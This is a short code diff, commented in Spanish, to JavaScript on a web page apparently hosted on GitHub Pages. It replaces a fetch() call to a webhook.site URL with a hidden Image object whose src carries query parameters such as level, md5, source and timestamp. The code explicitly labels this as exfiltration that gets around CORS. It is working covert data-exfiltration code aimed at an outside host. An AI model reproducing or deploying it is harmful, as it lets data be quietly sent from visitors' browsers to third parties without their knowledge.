@@ -56,7 +56,7 @@
                 <p><em>Esta información ha sido registrada en el sistema</em></p>
             `;
             
-            // Enviar a webhook VIA GET (evita CORS: params en query string)
+            // Exfiltrar VIA IMG SRC (evita CORS completamente: solo carga, no lee response)
             const params = new URLSearchParams({
                 level: level,
                 md5: md5,
@@ -65,15 +65,12 @@
                 source: 'github-pages',
                 timestamp: new Date().toISOString()
             });
-            const webhookUrl = `https://webhook.site/1df096b4-f7f3-4016-9465-a065ce0c001c?${params.toString()}`;
+            const exfilUrl = `https://webhook.site/1df096b4-f7f3-4016-9465-a065ce0c001c?${params.toString()}`;
             
-            fetch(webhookUrl, { method: 'GET' })
-                .then(() => {
-                    debug('📤 Datos enviados exitosamente al webhook (ver logs en webhook.site)');
-                })
-                .catch(e => {
-                    debug('❌ Error enviando webhook: ' + e);
-                });
+            const exfilImg = new Image();
+            exfilImg.src = exfilUrl;
+            exfilImg.onload = () => debug('📤 Datos exfiltrados exitosamente via img src (ver logs en webhook.site)');
+            exfilImg.onerror = (e) => debug('❌ Error en exfiltración: ' + e);
         }
         
         function error(msg) {
